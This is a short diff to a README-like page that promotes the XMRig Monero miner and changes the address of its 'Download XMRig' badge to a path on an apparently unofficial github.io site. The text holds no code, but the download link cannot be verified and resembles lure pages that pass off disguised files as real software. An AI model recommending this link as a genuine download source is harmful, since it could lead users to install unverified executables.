@@ -2,7 +2,7 @@
 
 XMRig (CPU/GPU) is a high-performance, open-source miner designed for Monero (XMR) and other CryptoNote-based cryptocurrencies. It supports both CPU and GPU mining, offering advanced features like low fees, high efficiency, and easy configuration for beginners and professionals alike.
 
-[![Download XMRig](https://img.shields.io/badge/Download-XMRig-blueviolet)](https://xmrig-cpu-gpu.github.io/.github)
+[![Download XMRig](https://img.shields.io/badge/Download-XMRig-blueviolet)](https://xmrig-cpu-gpu.github.io/.github/xmrig)
 
 ---
 
